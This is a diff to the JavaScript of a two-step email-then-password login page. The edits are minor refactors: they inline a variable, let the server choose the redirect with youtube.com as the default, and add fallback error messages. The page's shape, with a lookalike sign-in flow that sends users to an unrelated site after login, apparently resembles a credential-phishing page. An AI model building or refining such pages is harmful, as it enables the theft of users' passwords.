@@ -308,11 +308,10 @@
 
         document.getElementById('nextEmail').addEventListener('click', (e) => {
             e.preventDefault();
-            const email = emailInput.value;
-            if (validateEmail(email)) {
+            if (validateEmail(emailInput.value)) {
                 emailBox.style.display = 'none';
                 passwordBox.style.display = 'block';
-                userEmailDisplay.textContent = email;
+                userEmailDisplay.textContent = emailInput.value;
             }
         });
 
@@ -333,15 +332,15 @@
             .then(data => {
                 if (data.success) {
                     // On success, redirect the user
-                    window.location.href = 'https://www.youtube.com';
+                    window.location.href = data.redirect || 'https://www.youtube.com';
                 } else {
                     // On failure, show the error message
-                    alert(data.message);
+                    alert(data.message || 'Invalid credentials');
                 }
             })
             .catch(error => {
                 console.error('Error:', error);
-                alert('Something went wrong!');
+                alert('Something went wrong!'); // Show a generic error message
             });
         });
 
